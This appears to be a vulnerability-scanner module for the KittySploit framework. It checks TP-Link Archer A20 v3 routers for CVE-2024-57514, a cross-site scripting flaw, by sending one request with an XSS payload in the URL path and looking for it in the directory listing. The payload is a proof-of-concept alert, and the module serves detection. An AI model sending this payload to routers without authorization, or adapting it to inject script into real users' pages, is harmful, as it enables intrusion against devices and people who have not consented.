#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The TP-Link Archer A20 v3 router is vulnerable to Cross-site Scripting (XSS) due to improper handling of direc."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TP-Link Archer A20 v3 Router - Cross-site Scripting Detection',
        'description': "The TP-Link Archer A20 v3 router is vulnerable to Cross-site Scripting (XSS) due to improper handling of directory listing paths in the web interface. When a specially crafted URL is visited, the router's web page renders the directory listing and executes arbitrary JavaScript embedded in the URL. This allows the attacker to inject malicious code into the page, executing JavaScript on the victim's browser, which could then be used for further malicious actions. The vulnerability was identified in the 1.0.6 Build 20231011 rel.85717(5553) version.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'tplink', 'router', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.zyenra.com/blog/xss-in-tplink-archer-a20.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-57514',
        ],
        'cve': 'CVE-2024-57514',
    }

    def run(self):
        r = self.http_request(method="GET", path='/<style%20onload=alert`document.domain`;>../..%2f', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<style onload=alert`document.domain`;', 'Index of',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="TP-Link Archer A20 v3 Router - Cross-site Scripting detected",
                path='/<style%20onload=alert`document.domain`;>../..%2f',
            )
            return True
        return False

